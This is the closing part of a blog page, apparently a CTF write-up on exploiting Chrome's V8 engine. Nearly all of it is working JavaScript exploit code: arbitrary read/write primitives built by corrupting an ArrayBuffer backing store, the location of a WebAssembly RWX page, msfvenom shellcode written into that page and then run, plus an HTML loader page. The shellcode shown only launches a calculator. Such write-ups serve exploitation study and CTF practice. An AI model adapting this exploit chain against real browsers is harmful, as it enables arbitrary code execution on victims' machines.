</span></span><span class="line"><span class="cl">    <span class="c1">// Write to index 0 as a floating point value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// creating an ArrayBuffer holding the value of a 64-bit pointer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// creating a dataview for the ArrayBuffer object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieving the address of the ArrayBuffer object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieveing the address of the backing_store pointer of the
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// ArrayBuffer object located at offset +0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// overwritting the backing_store pointer with the value we desire
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// to overwrite
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// using the dataview to dereference the backing pointer and to
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// do the write for us
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">dataview</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// syntax: setBigUint64(byteOffset, value, littleEndian)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// based on https://wasdk.github.io/WasmFiddle/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// this is some &#39;container&#39; code implementing a return 0 to force 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// the creation of a RWX page. contents will be overwritten with shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">			<span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieving entry-point of wasm instance
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// retrieving rwx page base at offset 0x88 from wasm instance
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="nx">n</span><span class="o">+</span><span class="mh">0x88</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	    <span class="c1">// retrieving ArrayBuffer&#39;s backing store pointer at offset 0x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// msfvenom -p linux/x64/exec CMD=&#39;xcalc&#39; --format dword
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">shellcode</span><span class="o">=</span><span class="p">[</span>					
</span></span><span class="line"><span class="cl">		<span class="mh">0x90909090</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x90909090</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x782fb848</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x636c6163</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x48500000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x73752fb8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x69622f72</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x8948506e</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0xc03148e7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x89485750</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0xd23148e6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x3ac0c748</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x50000030</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x4944b848</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x414c5053</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x48503d59</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x3148e289</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x485250c0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0xc748e289</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x00003bc0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mh">0x050f00</span>
</span></span><span class="line"><span class="cl">	<span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">f</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">exploit</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>exploit.html</code> layout should be as follows for the exploit to work:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">$cat exploit.html
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;exploit.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">ulexec</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
        2021-05-20
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/pwn/">pwn</a>
          <a href="/tags/ctf/">ctf</a>
          <a href="/tags/chrome/">chrome</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/2022-02-22-shelfchrome/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">SHELF encounters of the elements kind</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="/post/2021-04-09-htb_modern_typer/">
            <span class="next-text nav-default">HTB 2021: Modern Typer </span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="ulexecve@protonmail.com" class="iconfont icon-email" title="email"></a>
      <a href="https://twitter.com/ulexec" class="iconfont icon-twitter" title="twitter"></a>
      <a href="https://linkedin.com/in/ignacio-sanmillan-1aa244b8" class="iconfont icon-linkedin" title="linkedin"></a>
      <a href="https://github.com/ulexec" class="iconfont icon-github" title="github"></a>
  <a href="http://ulexec.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2017 - 
    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>ulexec</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>








</body>
</html>
